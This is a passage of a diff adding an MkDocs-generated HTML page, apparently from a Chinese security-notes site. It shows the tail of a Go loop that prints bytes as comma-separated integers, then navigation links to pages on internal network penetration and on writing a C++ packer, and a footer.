+  for _,i:=range data{
+    fmt.Print(strconv.Itoa(int(i))+&quot;,&quot;)
+  }
+</code></pre>
+<p>\</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="btn btn-xs btn-link">
+        内网渗透
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/" class="btn btn-xs btn-link">
+        从0开始用C++写一个加壳器
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
